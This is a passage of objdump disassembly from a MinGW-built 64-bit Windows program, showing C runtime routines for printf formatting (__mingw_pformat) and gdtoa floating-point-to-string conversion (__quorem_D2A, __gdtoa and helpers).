   14000611f:	e9 1f ff ff ff       	jmp    140006043 <__mingw_pformat+0x8c3>
   140006124:	0f b7 c0             	movzwl %ax,%eax
   140006127:	e9 8b f8 ff ff       	jmp    1400059b7 <__mingw_pformat+0x237>
   14000612c:	48 0f bf c9          	movswq %cx,%rcx
   140006130:	e9 f9 f8 ff ff       	jmp    140005a2e <__mingw_pformat+0x2ae>
   140006135:	48 89 02             	mov    %rax,(%rdx)
   140006138:	e9 4f f9 ff ff       	jmp    140005a8c <__mingw_pformat+0x30c>
   14000613d:	83 e9 30             	sub    $0x30,%ecx
   140006140:	41 89 0b             	mov    %ecx,(%r11)
   140006143:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140006147:	48 89 ee             	mov    %rbp,%rsi
   14000614a:	e9 08 f8 ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   14000614f:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140006153:	41 be 02 00 00 00    	mov    $0x2,%r14d
   140006159:	48 89 ee             	mov    %rbp,%rsi
   14000615c:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%rsp)
   140006163:	00 00 00 00 
   140006167:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   14000616e:	00 
   14000616f:	e9 e3 f7 ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140006174:	49 8b 45 00          	mov    0x0(%r13),%rax
   140006178:	e9 3a f8 ff ff       	jmp    1400059b7 <__mingw_pformat+0x237>
   14000617d:	49 8b 4d 00          	mov    0x0(%r13),%rcx
   140006181:	e9 a8 f8 ff ff       	jmp    140005a2e <__mingw_pformat+0x2ae>
   140006186:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000618b:	48 89 c1             	mov    %rax,%rcx
   14000618e:	e8 4d e4 ff ff       	call   1400045e0 <__pformat_int.isra.0>
   140006193:	e9 f0 f8 ff ff       	jmp    140005a88 <__mingw_pformat+0x308>
   140006198:	80 7e 02 34          	cmpb   $0x34,0x2(%rsi)
   14000619c:	0f 84 ad 00 00 00    	je     14000624f <__mingw_pformat+0xacf>
   1400061a2:	8b 44 24 78          	mov    0x78(%rsp),%eax
   1400061a6:	8b b4 24 94 00 00 00 	mov    0x94(%rsp),%esi
   1400061ad:	f6 c4 40             	test   $0x40,%ah
   1400061b0:	75 0d                	jne    1400061bf <__mingw_pformat+0xa3f>
   1400061b2:	39 b4 24 98 00 00 00 	cmp    %esi,0x98(%rsp)
   1400061b9:	0f 8e a3 f6 ff ff    	jle    140005862 <__mingw_pformat+0xe2>
   1400061bf:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   1400061c4:	f6 c4 20             	test   $0x20,%ah
   1400061c7:	0f 85 f6 00 00 00    	jne    1400062c3 <__mingw_pformat+0xb43>
   1400061cd:	48 63 c6             	movslq %esi,%rax
   1400061d0:	c6 04 02 25          	movb   $0x25,(%rdx,%rax,1)
   1400061d4:	e9 89 f6 ff ff       	jmp    140005862 <__mingw_pformat+0xe2>
   1400061d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400061e0:	88 02                	mov    %al,(%rdx)
   1400061e2:	e9 a5 f8 ff ff       	jmp    140005a8c <__mingw_pformat+0x30c>
   1400061e7:	0f b6 46 02          	movzbl 0x2(%rsi),%eax
   1400061eb:	41 ba 03 00 00 00    	mov    $0x3,%r10d
   1400061f1:	48 83 c6 02          	add    $0x2,%rsi
   1400061f5:	41 be 04 00 00 00    	mov    $0x4,%r14d
   1400061fb:	e9 57 f7 ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140006200:	0f b6 46 02          	movzbl 0x2(%rsi),%eax
   140006204:	41 ba 05 00 00 00    	mov    $0x5,%r10d
   14000620a:	48 83 c6 02          	add    $0x2,%rsi
   14000620e:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140006214:	e9 3e f7 ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140006219:	b9 25 00 00 00       	mov    $0x25,%ecx
   14000621e:	e8 8d 31 00 00       	call   1400093b0 <fputc>
   140006223:	e9 3f fb ff ff       	jmp    140005d67 <__mingw_pformat+0x5e7>
   140006228:	41 8b 45 00          	mov    0x0(%r13),%eax
   14000622c:	e9 86 f7 ff ff       	jmp    1400059b7 <__mingw_pformat+0x237>
   140006231:	66 89 02             	mov    %ax,(%rdx)
   140006234:	e9 53 f8 ff ff       	jmp    140005a8c <__mingw_pformat+0x30c>
   140006239:	45 85 f6             	test   %r14d,%r14d
   14000623c:	75 43                	jne    140006281 <__mingw_pformat+0xb01>
   14000623e:	81 4c 24 78 00 04 00 	orl    $0x400,0x78(%rsp)
   140006245:	00 
   140006246:	f7 5c 24 7c          	negl   0x7c(%rsp)
   14000624a:	e9 c8 fb ff ff       	jmp    140005e17 <__mingw_pformat+0x697>
   14000624f:	0f b6 46 03          	movzbl 0x3(%rsi),%eax
   140006253:	41 ba 03 00 00 00    	mov    $0x3,%r10d
   140006259:	48 83 c6 03          	add    $0x3,%rsi
   14000625d:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140006263:	e9 ef f6 ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140006268:	0f b6 46 03          	movzbl 0x3(%rsi),%eax
   14000626c:	41 ba 02 00 00 00    	mov    $0x2,%r10d
   140006272:	48 83 c6 03          	add    $0x3,%rsi
   140006276:	41 be 04 00 00 00    	mov    $0x4,%r14d
   14000627c:	e9 d6 f6 ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   140006281:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   140006285:	49 89 d5             	mov    %rdx,%r13
   140006288:	48 89 ee             	mov    %rbp,%rsi
   14000628b:	45 31 db             	xor    %r11d,%r11d
   14000628e:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
   140006295:	ff ff ff ff 
   140006299:	41 be 02 00 00 00    	mov    $0x2,%r14d
   14000629f:	e9 b3 f6 ff ff       	jmp    140005957 <__mingw_pformat+0x1d7>
   1400062a4:	44 89 d1             	mov    %r10d,%ecx
   1400062a7:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400062ac:	48 8d 15 17 53 00 00 	lea    0x5317(%rip),%rdx        # 14000b5ca <.rdata+0x1a>
   1400062b3:	81 e1 00 80 00 00    	and    $0x8000,%ecx
   1400062b9:	e8 82 dc ff ff       	call   140003f40 <__pformat_emit_inf_or_nan>
   1400062be:	e9 c5 f7 ff ff       	jmp    140005a88 <__mingw_pformat+0x308>
   1400062c3:	b9 25 00 00 00       	mov    $0x25,%ecx
   1400062c8:	e8 e3 30 00 00       	call   1400093b0 <fputc>
   1400062cd:	e9 90 f5 ff ff       	jmp    140005862 <__mingw_pformat+0xe2>
   1400062d2:	90                   	nop
   1400062d3:	90                   	nop
   1400062d4:	90                   	nop
   1400062d5:	90                   	nop
   1400062d6:	90                   	nop
   1400062d7:	90                   	nop
   1400062d8:	90                   	nop
   1400062d9:	90                   	nop
   1400062da:	90                   	nop
   1400062db:	90                   	nop
   1400062dc:	90                   	nop
   1400062dd:	90                   	nop
   1400062de:	90                   	nop
   1400062df:	90                   	nop

00000001400062e0 <__rv_alloc_D2A>:
   1400062e0:	53                   	push   %rbx
   1400062e1:	48 83 ec 20          	sub    $0x20,%rsp
   1400062e5:	31 db                	xor    %ebx,%ebx
   1400062e7:	83 f9 1b             	cmp    $0x1b,%ecx
   1400062ea:	7e 18                	jle    140006304 <__rv_alloc_D2A+0x24>
   1400062ec:	b8 04 00 00 00       	mov    $0x4,%eax
   1400062f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400062f8:	01 c0                	add    %eax,%eax
   1400062fa:	83 c3 01             	add    $0x1,%ebx
   1400062fd:	8d 50 17             	lea    0x17(%rax),%edx
   140006300:	39 ca                	cmp    %ecx,%edx
   140006302:	7c f4                	jl     1400062f8 <__rv_alloc_D2A+0x18>
   140006304:	89 d9                	mov    %ebx,%ecx
   140006306:	e8 45 1e 00 00       	call   140008150 <__Balloc_D2A>
   14000630b:	89 18                	mov    %ebx,(%rax)
   14000630d:	48 83 c0 04          	add    $0x4,%rax
   140006311:	48 83 c4 20          	add    $0x20,%rsp
   140006315:	5b                   	pop    %rbx
   140006316:	c3                   	ret
   140006317:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000631e:	00 00 

0000000140006320 <__nrv_alloc_D2A>:
   140006320:	57                   	push   %rdi
   140006321:	56                   	push   %rsi
   140006322:	53                   	push   %rbx
   140006323:	48 83 ec 20          	sub    $0x20,%rsp
   140006327:	48 89 ce             	mov    %rcx,%rsi
   14000632a:	48 89 d7             	mov    %rdx,%rdi
   14000632d:	41 83 f8 1b          	cmp    $0x1b,%r8d
   140006331:	7e 65                	jle    140006398 <__nrv_alloc_D2A+0x78>
   140006333:	b8 04 00 00 00       	mov    $0x4,%eax
   140006338:	31 db                	xor    %ebx,%ebx
   14000633a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140006340:	01 c0                	add    %eax,%eax
   140006342:	83 c3 01             	add    $0x1,%ebx
   140006345:	8d 50 17             	lea    0x17(%rax),%edx
   140006348:	41 39 d0             	cmp    %edx,%r8d
   14000634b:	7f f3                	jg     140006340 <__nrv_alloc_D2A+0x20>
   14000634d:	89 d9                	mov    %ebx,%ecx
   14000634f:	e8 fc 1d 00 00       	call   140008150 <__Balloc_D2A>
   140006354:	48 8d 56 01          	lea    0x1(%rsi),%rdx
   140006358:	89 18                	mov    %ebx,(%rax)
   14000635a:	0f b6 0e             	movzbl (%rsi),%ecx
   14000635d:	4c 8d 40 04          	lea    0x4(%rax),%r8
   140006361:	88 48 04             	mov    %cl,0x4(%rax)
   140006364:	4c 89 c0             	mov    %r8,%rax
   140006367:	84 c9                	test   %cl,%cl
   140006369:	74 16                	je     140006381 <__nrv_alloc_D2A+0x61>
   14000636b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006370:	0f b6 0a             	movzbl (%rdx),%ecx
   140006373:	48 83 c0 01          	add    $0x1,%rax
   140006377:	48 83 c2 01          	add    $0x1,%rdx
   14000637b:	88 08                	mov    %cl,(%rax)
   14000637d:	84 c9                	test   %cl,%cl
   14000637f:	75 ef                	jne    140006370 <__nrv_alloc_D2A+0x50>
   140006381:	48 85 ff             	test   %rdi,%rdi
   140006384:	74 03                	je     140006389 <__nrv_alloc_D2A+0x69>
   140006386:	48 89 07             	mov    %rax,(%rdi)
   140006389:	4c 89 c0             	mov    %r8,%rax
   14000638c:	48 83 c4 20          	add    $0x20,%rsp
   140006390:	5b                   	pop    %rbx
   140006391:	5e                   	pop    %rsi
   140006392:	5f                   	pop    %rdi
   140006393:	c3                   	ret
   140006394:	0f 1f 40 00          	nopl   0x0(%rax)
   140006398:	31 db                	xor    %ebx,%ebx
   14000639a:	eb b1                	jmp    14000634d <__nrv_alloc_D2A+0x2d>
   14000639c:	0f 1f 40 00          	nopl   0x0(%rax)

00000001400063a0 <__freedtoa>:
   1400063a0:	ba 01 00 00 00       	mov    $0x1,%edx
   1400063a5:	48 89 c8             	mov    %rcx,%rax
   1400063a8:	8b 49 fc             	mov    -0x4(%rcx),%ecx
   1400063ab:	d3 e2                	shl    %cl,%edx
   1400063ad:	66 0f 6e c1          	movd   %ecx,%xmm0
   1400063b1:	48 8d 48 fc          	lea    -0x4(%rax),%rcx
   1400063b5:	66 0f 6e ca          	movd   %edx,%xmm1
   1400063b9:	66 0f 62 c1          	punpckldq %xmm1,%xmm0
   1400063bd:	66 0f d6 40 04       	movq   %xmm0,0x4(%rax)
   1400063c2:	e9 79 1e 00 00       	jmp    140008240 <__Bfree_D2A>
   1400063c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400063ce:	00 00 

00000001400063d0 <__quorem_D2A>:
   1400063d0:	41 57                	push   %r15
   1400063d2:	41 56                	push   %r14
   1400063d4:	41 55                	push   %r13
   1400063d6:	41 54                	push   %r12
   1400063d8:	55                   	push   %rbp
   1400063d9:	57                   	push   %rdi
   1400063da:	56                   	push   %rsi
   1400063db:	53                   	push   %rbx
   1400063dc:	48 83 ec 38          	sub    $0x38,%rsp
   1400063e0:	31 c0                	xor    %eax,%eax
   1400063e2:	8b 72 14             	mov    0x14(%rdx),%esi
   1400063e5:	49 89 cc             	mov    %rcx,%r12
   1400063e8:	49 89 d3             	mov    %rdx,%r11
   1400063eb:	39 71 14             	cmp    %esi,0x14(%rcx)
   1400063ee:	0f 8c f0 00 00 00    	jl     1400064e4 <__quorem_D2A+0x114>
   1400063f4:	83 ee 01             	sub    $0x1,%esi
   1400063f7:	48 8d 5a 18          	lea    0x18(%rdx),%rbx
   1400063fb:	48 8d 69 18          	lea    0x18(%rcx),%rbp
   1400063ff:	31 d2                	xor    %edx,%edx
   140006401:	4c 63 d6             	movslq %esi,%r10
   140006404:	49 c1 e2 02          	shl    $0x2,%r10
   140006408:	4a 8d 3c 13          	lea    (%rbx,%r10,1),%rdi
   14000640c:	49 01 ea             	add    %rbp,%r10
   14000640f:	8b 07                	mov    (%rdi),%eax
   140006411:	45 8b 02             	mov    (%r10),%r8d
   140006414:	8d 48 01             	lea    0x1(%rax),%ecx
   140006417:	44 89 c0             	mov    %r8d,%eax
   14000641a:	f7 f1                	div    %ecx
   14000641c:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140006420:	41 89 c5             	mov    %eax,%r13d
   140006423:	41 39 c8             	cmp    %ecx,%r8d
   140006426:	72 5e                	jb     140006486 <__quorem_D2A+0xb6>
   140006428:	41 89 c7             	mov    %eax,%r15d
   14000642b:	49 89 d9             	mov    %rbx,%r9
   14000642e:	49 89 e8             	mov    %rbp,%r8
   140006431:	45 31 f6             	xor    %r14d,%r14d
   140006434:	31 c9                	xor    %ecx,%ecx
   140006436:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000643d:	00 00 00 
   140006440:	41 8b 01             	mov    (%r9),%eax
   140006443:	41 8b 10             	mov    (%r8),%edx
   140006446:	49 83 c1 04          	add    $0x4,%r9
   14000644a:	49 83 c0 04          	add    $0x4,%r8
   14000644e:	49 0f af c7          	imul   %r15,%rax
   140006452:	4c 01 f0             	add    %r14,%rax
   140006455:	49 89 c6             	mov    %rax,%r14
   140006458:	89 c0                	mov    %eax,%eax
   14000645a:	48 29 c2             	sub    %rax,%rdx
   14000645d:	49 c1 ee 20          	shr    $0x20,%r14
   140006461:	48 89 d0             	mov    %rdx,%rax
   140006464:	48 29 c8             	sub    %rcx,%rax
   140006467:	48 89 c1             	mov    %rax,%rcx
   14000646a:	41 89 40 fc          	mov    %eax,-0x4(%r8)
   14000646e:	48 c1 e9 20          	shr    $0x20,%rcx
   140006472:	83 e1 01             	and    $0x1,%ecx
   140006475:	4c 39 cf             	cmp    %r9,%rdi
   140006478:	73 c6                	jae    140006440 <__quorem_D2A+0x70>
   14000647a:	45 8b 0a             	mov    (%r10),%r9d
   14000647d:	45 85 c9             	test   %r9d,%r9d
   140006480:	0f 84 a5 00 00 00    	je     14000652b <__quorem_D2A+0x15b>
   140006486:	4c 89 da             	mov    %r11,%rdx
   140006489:	4c 89 e1             	mov    %r12,%rcx
   14000648c:	e8 7f 23 00 00       	call   140008810 <__cmp_D2A>
   140006491:	85 c0                	test   %eax,%eax
   140006493:	78 4b                	js     1400064e0 <__quorem_D2A+0x110>
   140006495:	48 89 e9             	mov    %rbp,%rcx
   140006498:	31 d2                	xor    %edx,%edx
   14000649a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400064a0:	8b 01                	mov    (%rcx),%eax
   1400064a2:	44 8b 03             	mov    (%rbx),%r8d
   1400064a5:	48 83 c3 04          	add    $0x4,%rbx
   1400064a9:	48 83 c1 04          	add    $0x4,%rcx
   1400064ad:	4c 29 c0             	sub    %r8,%rax
   1400064b0:	48 29 d0             	sub    %rdx,%rax
   1400064b3:	48 89 c2             	mov    %rax,%rdx
   1400064b6:	89 41 fc             	mov    %eax,-0x4(%rcx)
   1400064b9:	48 c1 ea 20          	shr    $0x20,%rdx
   1400064bd:	83 e2 01             	and    $0x1,%edx
   1400064c0:	48 39 df             	cmp    %rbx,%rdi
   1400064c3:	73 db                	jae    1400064a0 <__quorem_D2A+0xd0>
   1400064c5:	48 63 c6             	movslq %esi,%rax
   1400064c8:	48 8d 44 85 00       	lea    0x0(%rbp,%rax,4),%rax
   1400064cd:	8b 08                	mov    (%rax),%ecx
   1400064cf:	85 c9                	test   %ecx,%ecx
   1400064d1:	74 2e                	je     140006501 <__quorem_D2A+0x131>
   1400064d3:	41 8d 45 01          	lea    0x1(%r13),%eax
   1400064d7:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   1400064db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400064e0:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1400064e4:	48 83 c4 38          	add    $0x38,%rsp
   1400064e8:	5b                   	pop    %rbx
   1400064e9:	5e                   	pop    %rsi
   1400064ea:	5f                   	pop    %rdi
   1400064eb:	5d                   	pop    %rbp
   1400064ec:	41 5c                	pop    %r12
   1400064ee:	41 5d                	pop    %r13
   1400064f0:	41 5e                	pop    %r14
   1400064f2:	41 5f                	pop    %r15
   1400064f4:	c3                   	ret
   1400064f5:	0f 1f 00             	nopl   (%rax)
   1400064f8:	8b 10                	mov    (%rax),%edx
   1400064fa:	85 d2                	test   %edx,%edx
   1400064fc:	75 0c                	jne    14000650a <__quorem_D2A+0x13a>
   1400064fe:	83 ee 01             	sub    $0x1,%esi
   140006501:	48 83 e8 04          	sub    $0x4,%rax
   140006505:	48 39 c5             	cmp    %rax,%rbp
   140006508:	72 ee                	jb     1400064f8 <__quorem_D2A+0x128>
   14000650a:	41 8d 45 01          	lea    0x1(%r13),%eax
   14000650e:	41 89 74 24 14       	mov    %esi,0x14(%r12)
   140006513:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140006517:	eb c7                	jmp    1400064e0 <__quorem_D2A+0x110>
   140006519:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140006520:	45 8b 02             	mov    (%r10),%r8d
   140006523:	45 85 c0             	test   %r8d,%r8d
   140006526:	75 0c                	jne    140006534 <__quorem_D2A+0x164>
   140006528:	83 ee 01             	sub    $0x1,%esi
   14000652b:	49 83 ea 04          	sub    $0x4,%r10
   14000652f:	4c 39 d5             	cmp    %r10,%rbp
   140006532:	72 ec                	jb     140006520 <__quorem_D2A+0x150>
   140006534:	41 89 74 24 14       	mov    %esi,0x14(%r12)
   140006539:	4c 89 da             	mov    %r11,%rdx
   14000653c:	4c 89 e1             	mov    %r12,%rcx
   14000653f:	e8 cc 22 00 00       	call   140008810 <__cmp_D2A>
   140006544:	85 c0                	test   %eax,%eax
   140006546:	0f 89 49 ff ff ff    	jns    140006495 <__quorem_D2A+0xc5>
   14000654c:	eb 92                	jmp    1400064e0 <__quorem_D2A+0x110>
   14000654e:	90                   	nop
   14000654f:	90                   	nop

0000000140006550 <__gdtoa>:
   140006550:	41 57                	push   %r15
   140006552:	41 56                	push   %r14
   140006554:	41 55                	push   %r13
   140006556:	41 54                	push   %r12
   140006558:	55                   	push   %rbp
   140006559:	57                   	push   %rdi
   14000655a:	56                   	push   %rsi
   14000655b:	53                   	push   %rbx
   14000655c:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
   140006563:	8b 84 24 10 01 00 00 	mov    0x110(%rsp),%eax
   14000656a:	41 8b 29             	mov    (%r9),%ebp
   14000656d:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140006571:	49 89 cd             	mov    %rcx,%r13
   140006574:	4c 89 c7             	mov    %r8,%rdi
   140006577:	4c 89 cb             	mov    %r9,%rbx
   14000657a:	8b 84 24 18 01 00 00 	mov    0x118(%rsp),%eax
   140006581:	89 54 24 38          	mov    %edx,0x38(%rsp)
   140006585:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140006589:	48 8b 84 24 20 01 00 	mov    0x120(%rsp),%rax
   140006590:	00 
   140006591:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006596:	48 8b 84 24 28 01 00 	mov    0x128(%rsp),%rax
   14000659d:	00 
   14000659e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400065a3:	89 e8                	mov    %ebp,%eax
   1400065a5:	83 e0 cf             	and    $0xffffffcf,%eax
   1400065a8:	41 89 01             	mov    %eax,(%r9)
   1400065ab:	89 e8                	mov    %ebp,%eax
   1400065ad:	83 e0 07             	and    $0x7,%eax
   1400065b0:	83 f8 03             	cmp    $0x3,%eax
   1400065b3:	0f 84 bf 02 00 00    	je     140006878 <__gdtoa+0x328>
   1400065b9:	89 ee                	mov    %ebp,%esi
   1400065bb:	83 e6 04             	and    $0x4,%esi
   1400065be:	89 74 24 50          	mov    %esi,0x50(%rsp)
   1400065c2:	0f 85 28 02 00 00    	jne    1400067f0 <__gdtoa+0x2a0>
   1400065c8:	85 c0                	test   %eax,%eax
   1400065ca:	0f 84 68 02 00 00    	je     140006838 <__gdtoa+0x2e8>
   1400065d0:	44 8b 21             	mov    (%rcx),%r12d
   1400065d3:	b8 20 00 00 00       	mov    $0x20,%eax
   1400065d8:	31 c9                	xor    %ecx,%ecx
   1400065da:	41 83 fc 20          	cmp    $0x20,%r12d
   1400065de:	7e 0a                	jle    1400065ea <__gdtoa+0x9a>
   1400065e0:	01 c0                	add    %eax,%eax
   1400065e2:	83 c1 01             	add    $0x1,%ecx
   1400065e5:	41 39 c4             	cmp    %eax,%r12d
   1400065e8:	7f f6                	jg     1400065e0 <__gdtoa+0x90>
   1400065ea:	e8 61 1b 00 00       	call   140008150 <__Balloc_D2A>
   1400065ef:	41 8d 4c 24 ff       	lea    -0x1(%r12),%ecx
   1400065f4:	c1 f9 05             	sar    $0x5,%ecx
   1400065f7:	48 89 c6             	mov    %rax,%rsi
   1400065fa:	48 8d 50 18          	lea    0x18(%rax),%rdx
   1400065fe:	48 89 f8             	mov    %rdi,%rax
   140006601:	48 63 c9             	movslq %ecx,%rcx
   140006604:	4c 8d 04 8f          	lea    (%rdi,%rcx,4),%r8
   140006608:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000660f:	00 
   140006610:	44 8b 08             	mov    (%rax),%r9d
   140006613:	48 83 c0 04          	add    $0x4,%rax
   140006617:	48 83 c2 04          	add    $0x4,%rdx
   14000661b:	44 89 4a fc          	mov    %r9d,-0x4(%rdx)
   14000661f:	49 39 c0             	cmp    %rax,%r8
   140006622:	73 ec                	jae    140006610 <__gdtoa+0xc0>
   140006624:	48 8d 47 01          	lea    0x1(%rdi),%rax
   140006628:	49 83 c0 01          	add    $0x1,%r8
   14000662c:	48 c1 e1 02          	shl    $0x2,%rcx
   140006630:	49 39 c0             	cmp    %rax,%r8
   140006633:	b8 00 00 00 00       	mov    $0x0,%eax
   140006638:	48 0f 42 c8          	cmovb  %rax,%rcx
   14000663c:	48 83 c1 04          	add    $0x4,%rcx
   140006640:	48 c1 f9 02          	sar    $0x2,%rcx
   140006644:	41 89 ce             	mov    %ecx,%r14d
   140006647:	48 8d 04 8e          	lea    (%rsi,%rcx,4),%rax
   14000664b:	eb 10                	jmp    14000665d <__gdtoa+0x10d>
   14000664d:	0f 1f 00             	nopl   (%rax)
   140006650:	48 83 e8 04          	sub    $0x4,%rax
   140006654:	45 85 f6             	test   %r14d,%r14d
   140006657:	0f 84 43 02 00 00    	je     1400068a0 <__gdtoa+0x350>
   14000665d:	44 8b 78 14          	mov    0x14(%rax),%r15d
   140006661:	44 89 f2             	mov    %r14d,%edx
   140006664:	41 83 ee 01          	sub    $0x1,%r14d
   140006668:	45 85 ff             	test   %r15d,%r15d
   14000666b:	74 e3                	je     140006650 <__gdtoa+0x100>
   14000666d:	4d 63 f6             	movslq %r14d,%r14
   140006670:	89 56 14             	mov    %edx,0x14(%rsi)
   140006673:	c1 e2 05             	shl    $0x5,%edx
   140006676:	42 0f bd 44 b6 18    	bsr    0x18(%rsi,%r14,4),%eax
   14000667c:	83 f0 1f             	xor    $0x1f,%eax
   14000667f:	29 c2                	sub    %eax,%edx
   140006681:	41 89 d6             	mov    %edx,%r14d
   140006684:	48 89 f1             	mov    %rsi,%rcx
   140006687:	e8 54 19 00 00       	call   140007fe0 <__trailz_D2A>
   14000668c:	8b 4c 24 38          	mov    0x38(%rsp),%ecx
   140006690:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%rsp)
   140006697:	89 4c 24 58          	mov    %ecx,0x58(%rsp)
   14000669b:	85 c0                	test   %eax,%eax
   14000669d:	0f 85 0d 02 00 00    	jne    1400068b0 <__gdtoa+0x360>
   1400066a3:	44 8b 5e 14          	mov    0x14(%rsi),%r11d
   1400066a7:	45 85 db             	test   %r11d,%r11d
   1400066aa:	0f 84 80 01 00 00    	je     140006830 <__gdtoa+0x2e0>
   1400066b0:	48 8d 94 24 9c 00 00 	lea    0x9c(%rsp),%rdx
   1400066b7:	00 
   1400066b8:	48 89 f1             	mov    %rsi,%rcx
   1400066bb:	e8 60 23 00 00       	call   140008a20 <__b2d_D2A>
   1400066c0:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   1400066c4:	66 0f ef c9          	pxor   %xmm1,%xmm1
   1400066c8:	66 48 0f 7e c0       	movq   %xmm0,%rax
   1400066cd:	48 89 c2             	mov    %rax,%rdx
   1400066d0:	46 8d 04 31          	lea    (%rcx,%r14,1),%r8d
   1400066d4:	89 c0                	mov    %eax,%eax
   1400066d6:	48 c1 ea 20          	shr    $0x20,%rdx
   1400066da:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   1400066de:	81 e2 ff ff 0f 00    	and    $0xfffff,%edx
   1400066e4:	f2 0f 2a c9          	cvtsi2sd %ecx,%xmm1
   1400066e8:	f2 0f 59 0d 78 50 00 	mulsd  0x5078(%rip),%xmm1        # 14000b768 <.rdata+0x28>
   1400066ef:	00 
   1400066f0:	81 ca 00 00 f0 3f    	or     $0x3ff00000,%edx
   1400066f6:	49 89 d1             	mov    %rdx,%r9
   1400066f9:	49 c1 e1 20          	shl    $0x20,%r9
   1400066fd:	4c 09 c8             	or     %r9,%rax
   140006700:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140006706:	45 29 c1             	sub    %r8d,%r9d
   140006709:	66 48 0f 6e c0       	movq   %rax,%xmm0
   14000670e:	85 c9                	test   %ecx,%ecx
   140006710:	f2 0f 5c 05 38 50 00 	subsd  0x5038(%rip),%xmm0        # 14000b750 <.rdata+0x10>
   140006717:	00 
   140006718:	f2 0f 59 05 38 50 00 	mulsd  0x5038(%rip),%xmm0        # 14000b758 <.rdata+0x18>
   14000671f:	00 
   140006720:	44 0f 49 c9          	cmovns %ecx,%r9d
   140006724:	f2 0f 58 05 34 50 00 	addsd  0x5034(%rip),%xmm0        # 14000b760 <.rdata+0x20>
   14000672b:	00 
   14000672c:	41 81 e9 35 04 00 00 	sub    $0x435,%r9d
   140006733:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   140006737:	45 85 c9             	test   %r9d,%r9d
   14000673a:	7e 15                	jle    140006751 <__gdtoa+0x201>
   14000673c:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140006740:	f2 41 0f 2a c9       	cvtsi2sd %r9d,%xmm1
   140006745:	f2 0f 59 0d 23 50 00 	mulsd  0x5023(%rip),%xmm1        # 14000b770 <.rdata+0x30>
   14000674c:	00 
   14000674d:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   140006751:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140006755:	f2 44 0f 2c d8       	cvttsd2si %xmm0,%r11d
   14000675a:	66 0f 2f c8          	comisd %xmm0,%xmm1
   14000675e:	0f 87 8c 05 00 00    	ja     140006cf0 <__gdtoa+0x7a0>
   140006764:	41 89 c9             	mov    %ecx,%r9d
   140006767:	89 c0                	mov    %eax,%eax
   140006769:	41 c1 e1 14          	shl    $0x14,%r9d
   14000676d:	44 01 ca             	add    %r9d,%edx
   140006770:	89 d2                	mov    %edx,%edx
   140006772:	48 c1 e2 20          	shl    $0x20,%rdx
   140006776:	48 09 d0             	or     %rdx,%rax
   140006779:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140006780:	00 
   140006781:	49 89 c2             	mov    %rax,%r10
   140006784:	44 89 f0             	mov    %r14d,%eax
   140006787:	29 c8                	sub    %ecx,%eax
   140006789:	8d 48 ff             	lea    -0x1(%rax),%ecx
   14000678c:	89 4c 24 54          	mov    %ecx,0x54(%rsp)
   140006790:	41 83 fb 16          	cmp    $0x16,%r11d
   140006794:	0f 87 3e 01 00 00    	ja     1400068d8 <__gdtoa+0x388>
   14000679a:	4c 8b 0d bf 52 00 00 	mov    0x52bf(%rip),%r9        # 14000ba60 <.refptr.__tens_D2A>
   1400067a1:	49 63 d3             	movslq %r11d,%rdx
   1400067a4:	66 49 0f 6e ea       	movq   %r10,%xmm5
   1400067a9:	f2 41 0f 10 04 d1    	movsd  (%r9,%rdx,8),%xmm0
   1400067af:	66 0f 2f c5          	comisd %xmm5,%xmm0
   1400067b3:	0f 87 9f 05 00 00    	ja     140006d58 <__gdtoa+0x808>
   1400067b9:	85 c0                	test   %eax,%eax
   1400067bb:	0f 8e 8a 0f 00 00    	jle    14000774b <__gdtoa+0x11fb>
   1400067c1:	44 01 d9             	add    %r11d,%ecx
   1400067c4:	c7 44 24 7c 00 00 00 	movl   $0x0,0x7c(%rsp)
   1400067cb:	00 
   1400067cc:	89 4c 24 54          	mov    %ecx,0x54(%rsp)
   1400067d0:	44 89 5c 24 70       	mov    %r11d,0x70(%rsp)
